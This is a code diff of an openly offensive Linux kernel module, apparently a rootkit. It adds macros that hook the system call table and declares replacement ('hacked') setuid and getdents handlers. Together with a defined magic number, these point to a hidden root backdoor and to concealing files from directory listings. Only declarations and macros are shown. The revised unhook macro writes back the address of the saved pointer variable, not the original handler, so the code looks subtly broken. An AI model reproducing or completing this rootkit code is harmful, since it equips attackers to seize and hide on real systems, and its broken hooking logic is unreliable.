@@ -12,6 +12,13 @@
 #include <linux/fs.h>
 #include <linux/utsname.h>
 
+struct linux_dirent {
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
+};
+
 //macros
 #define BAIL_ON_ERROR(iError)                                                 \
     if (iError) {                                                             \
@@ -24,18 +31,19 @@
     printk(KERN_DEBUG "DEBUG [%s:%s at %d]: %s\n",         \
             __FILE__,__FUNCTION__,__LINE__, msg)
 
-#define SYSCALL_TABLE 0xffffffff818001c0
-
 #define MAGIC_NUMBER 12345
 
 #define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
-    orig_func = (void*) sys_call_table[__NR_index];                         \
-    sys_call_table[__NR_index] = (unsigned long) hacked_func
+    orig_func = (void *)sys_call_table[__NR_index];                        \
+    sys_call_table[__NR_index] = (unsigned long*)&hacked_func
 
 #define UNHOOK_SYSCALL(sys_call_table, orig_func, __NR_index)               \
-    sys_call_table[__NR_index] = (unsigned long) orig_func
+    sys_call_table[__NR_index] = (unsigned long*)&orig_func
 
-//original sycalls
-asmlinkage long (*orig_setuid) (uid_t uid);
+// Original system calls
+asmlinkage long (*orig_setuid)(uid_t uid);
+asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
-asmlinkage long (hacked_setuid) (uid_t uid);
+// Hacked system calls
+asmlinkage long hacked_setuid(uid_t uid);
+asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
